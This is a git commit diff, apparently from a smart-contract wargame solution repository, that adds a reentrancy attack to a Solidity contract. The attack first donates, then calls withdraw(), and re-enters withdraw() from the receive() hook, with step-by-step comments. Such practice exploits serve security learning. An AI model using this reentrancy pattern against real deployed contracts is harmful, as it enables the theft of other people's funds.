040454e53b014f978f81c92c992e08087ed10833
Kamil Chmielewski <chmielewski.kamil45@gmail.com>
2022-11-02 10:09:58 +0100

    ✨ feat(attack): add initial form of the attack

--- src/levels/10-Reentrancy/ReentranceAttack.sol
+++ src/levels/10-Reentrancy/ReentranceAttack.sol
@@ -13,4 +13,21 @@ contract ReentranceAttack {
     function sendDonation(address _to, uint256 _amountToDonate) public {
         reentrance.donate{value: _amountToDonate}(_to);
     }
+
+    function attack(
+        address _addrForDonation,
+        uint256 _amountToDonateAndWithdraw
+    ) public {
+        // 1st step - donate to appear in the balances mapping
+        reentrance.donate{value: _amountToDonateAndWithdraw}(_addrForDonation);
+
+        // 2nd step - call withdraw -> it will make a call to this contract
+        reentrance.withdraw(_amountToDonateAndWithdraw);
+    }
+
+    // 3rd step - external call with ether will trigger receive() func
+    receive() external payable {
+        // 4th step - we can re-enter the withdraw func
+        reentrance.withdraw(msg.value);
+    }
 }
